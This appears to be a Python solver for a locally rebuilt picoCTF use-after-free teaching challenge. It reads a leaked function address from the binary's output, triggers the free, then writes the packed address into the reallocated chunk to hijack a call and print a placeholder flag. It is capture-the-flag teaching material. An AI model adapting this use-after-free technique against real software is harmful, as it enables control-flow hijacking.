#!/usr/bin/env python3
"""Run the locally rebuilt PicoCTF UAF teaching artifact against a placeholder flag."""

from __future__ import annotations

import re
import struct
import subprocess
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
BINARY = ROOT / "challenge" / "vuln"


def read_until(process: subprocess.Popen[bytes], marker: bytes) -> bytes:
    data = bytearray()
    while not data.endswith(marker):
        next_byte = process.stdout.read(1) if process.stdout is not None else b""
        if not next_byte:
            raise RuntimeError(f"process ended before marker {marker!r}: {data!r}")
        data.extend(next_byte)
    return bytes(data)


def send(process: subprocess.Popen[bytes], data: bytes) -> None:
    if process.stdin is None:
        raise RuntimeError("stdin unavailable")
    process.stdin.write(data)
    process.stdin.flush()


def main() -> None:
    process = subprocess.Popen(
        [str(BINARY)],
        cwd=ROOT / "challenge",
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    try:
        menu = b"(e)xit\n"
        read_until(process, menu)

        send(process, b"s\n")
        subscription = read_until(process, menu)
        leak_match = re.search(rb"OOP! Memory leak\.\.\.(0x[0-9a-fA-F]+)", subscription)
        if leak_match is None:
            raise RuntimeError(f"missing function leak: {subscription!r}")
        target = int(leak_match.group(1), 16)

        send(process, b"i\n")
        read_until(process, b"You're leaving already(Y/N)?\n")
        send(process, b"y\n")
        read_until(process, menu)

        send(process, b"l\n")
        read_until(process, b"try anyways:\n")
        send(process, struct.pack("<I", target) + b"\x00\x00\x00\x00")

        line = process.stdout.readline() if process.stdout is not None else b""
        if b"picoCTF{LOCAL_UAF_DEMO_NOT_A_REAL_FLAG}" not in line:
            raise RuntimeError(f"local demo did not print teaching flag: {line!r}")
        print(f"leaked hahaexploitgobrrr: {target:#x}")
        print(line.decode().strip())
    finally:
        process.kill()
        process.wait()


if __name__ == "__main__":
    main()
